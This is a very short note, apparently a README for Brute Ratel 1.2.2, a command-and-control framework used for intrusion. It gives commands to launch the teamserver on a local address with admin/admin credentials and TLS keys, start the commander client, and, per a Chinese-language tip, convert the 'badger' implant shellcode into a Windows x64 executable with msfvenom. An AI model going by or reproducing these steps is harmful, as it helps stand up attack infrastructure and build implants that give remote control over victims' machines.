# bruteratel-1.2.2

./brute-ratel-linx64 -ratel -a admin -p admin -h 192.168.175.129:1337 -sc cert.pem -sk key.pem

./commander-runme

生成的exe可能有问题可以使用msfvenom进行转换

cat badger_x64_ret.bin | msfvenom -p - -f exe --platform win -a x64 -o badger-X64.exe
